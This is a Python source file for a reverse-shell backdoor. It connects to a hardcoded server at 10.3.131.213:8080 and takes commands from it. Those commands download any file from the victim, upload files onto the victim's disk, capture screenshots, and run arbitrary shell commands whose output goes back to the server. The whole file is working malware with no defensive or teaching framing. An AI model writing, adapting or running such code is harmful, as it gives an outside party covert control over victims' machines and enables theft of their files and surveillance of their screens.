import  socket
import subprocess
import os
import shutil
from  PIL import ImageGrab
import tempfile

def letSend(mysocket, path, fileName):
    try:
        os.makedirs(path, exist_ok=True) #Ensure path exists
        full_path = os.path.join(path, fileName)
        with open(full_path, 'ab') as f:
            while True:
                bits = mysocket.recv(1024)
                if bits.endswith(b"DONE"):
                    f.write(bits[:-4])
                    break
                if b"File not found" in bits or b"File is empty" in bits:
                    break

                f.write(bits)
    except Exception as e:
        pass

def letGrab(mysocket, path):
    try:
        if os.path.exists(path):
            with open(path, 'rb') as f:
                while chunk := f.read(1024):
                    mysocket.send(chunk)
            mysocket.send(b'DONE')
        else:
            mysocket.send(b'File not found')
    except Exception as e:
        mysocket.send(f"Error in file transfer: {str(e)}".encode())

def amalan():
    mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        mysocket.connect(("10.3.131.213",8080))

        while True:
            cmd = mysocket.recv(1024).decode(errors='ignore').strip()
            if not  cmd:
                continue

            if cmd.lower() == "tem":
                mysocket.close()
                break

            elif cmd.startswith("grab"):
                parts = cmd.split("*")
                if len(parts) < 2:
                    mysocket.send(b"[-] Invalid grab command format")
                    continue
                cmds, path = parts
                letGrab(mysocket, path)



            elif cmd.startswith("send"):
                send, path, fileName = cmd.split("*")
                try:
                    letSend(mysocket, path, fileName)
                except Exception as e:
                    informToServer = "[-] some error occured " + str(e)
                    mysocket.send(informToServer.encode())

            elif cmd.startswith("screenCap"):
                path = tempfile.mkdtemp()
                #print(path)
                image_path = os.path.join(path, "img.jpg")
                ImageGrab.grab().save(image_path,"JPEG")
                letGrab(mysocket,image_path)
                shutil.rmtree(path)

            else:
                CMD = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                output, error = CMD.communicate()
                mysocket.send(output + error)
    except Exception as e:
        mysocket.send(f"Error in : {str(e)}" .encode())
        mysocket.close()

def main():
    amalan()
if __name__ == "__main__":
    main()




